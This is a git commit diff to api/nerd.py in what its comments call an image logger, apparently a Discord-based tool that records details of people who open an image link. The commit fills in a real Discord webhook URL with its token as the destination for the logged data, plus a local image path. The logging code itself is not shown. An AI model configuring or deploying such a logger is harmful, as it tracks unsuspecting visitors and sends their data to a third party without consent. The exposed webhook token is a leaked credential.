989379b33294cd6d342da20cc3b714f5dac10553
pivetee <145782129+pivetee@users.noreply.github.com>
2023-10-03 17:44:41 +0100

    Update nerd.py

--- api/nerd.py
+++ api/nerd.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1158800492089057290/SBWixRUfTDIKAALBm1eB-kHwsE8S5bYzlomSnmWIqoNNy6fJ7T5DE72gfYePPO1MVlht",
+    "image": "file:///C:/Users/diogo/OneDrive/Imagens/d30d8c091a2415b829919480220c8abe.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
